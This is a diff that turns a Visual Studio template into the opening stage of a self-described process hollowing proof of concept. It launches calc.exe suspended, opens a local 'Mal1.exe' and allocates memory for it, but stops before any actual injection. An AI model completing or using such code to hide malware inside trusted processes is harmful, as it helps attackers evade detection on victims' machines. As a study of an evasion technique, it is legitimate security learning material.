@@ -1,20 +1,72 @@
-// ProcHollow.cpp : This file contains the 'main' function. Program execution begins and ends there.
-//
+//Author: Alec Wood
+//File: ProcHollow.cpp
+//Purpose: Proof of concept for Process Hollowing, using target: calc.exe and malware: Mal1.exe
 
-#include <iostream>
+#include<Windows.h>
+#include<iostream>
+#include<stdio.h>
+#pragma comment(lib, "ntdll.lib")
+using namespace std; //Need to remove and update entire source code
 
-int main()
-{
-    std::cout << "Hello World!\n";
+//This declaration will be used to hollow the process
+LONG(NTAPI* pfnZwUnmapViewOfSection)(HANDLE, PVOID);
+
+
+int main() {
+
+	LPSTARTUPINFOA startupInfo = new STARTUPINFOA();
+	LPPROCESS_INFORMATION processInfo = new PROCESS_INFORMATION();
+	CONTEXT c;
+
+
+	//Create victim process in suspended state
+	if (CreateProcessA(
+		(LPSTR)"C:\\Windows\\System32\\calc.exe",
+		NULL,
+		NULL,
+		NULL,
+		TRUE,
+		CREATE_SUSPENDED,
+		NULL,
+		NULL,
+		startupInfo,
+		processInfo) == 0) {
+		std::cout << "[*] Process Failed:  " << GetLastError();
+		return 1;
+	}
+
+
+	//Pass Mal1 to get handle
+	HANDLE hMal1 = CreateFileA(
+		(LPCSTR)"C:\\Users\\normk_e1w\\source\\repos\\PoC-Proc-Hollow\\Mal1\\x64\\Mal1.exe",
+		GENERIC_READ,
+		FILE_SHARE_READ,
+		NULL,
+		OPEN_EXISTING,
+		NULL,
+		NULL
+	);
+	std::cout << "[+] PID-> 0x" << processInfo->dwProcessId << endl;
+
+	if (hMal1 == INVALID_HANDLE_VALUE) {
+		std::cout << "[!] Failed to open: " << GetLastError() << endl;
+		TerminateProcess(processInfo->hProcess, 0);
+	}
+	std::cout << "[+] Malicious file opened." << endl;
+
+
+	//Retrieve size of Mal1 to use in VirtualAlloc().
+	DWORD mal1FileSize = GetFileSize(hMal1, 0);
+	std::cout << "[+] Mal1 file size: " << mal1FileSize << " bytes." << endl;
+
+
+	//Allocating memory for Mal1
+	PVOID pMal1Image = VirtualAlloc(
+		NULL,
+		mal1FileSize,
+		0x3000,
+		0x04
+	);
+
+	return 0;
 }
-
-// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
-// Debug program: F5 or Debug > Start Debugging menu
-
-// Tips for Getting Started: 
-//   1. Use the Solution Explorer window to add/manage files
-//   2. Use the Team Explorer window to connect to source control
-//   3. Use the Output window to see build output and other messages
-//   4. Use the Error List window to view errors
-//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
-//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
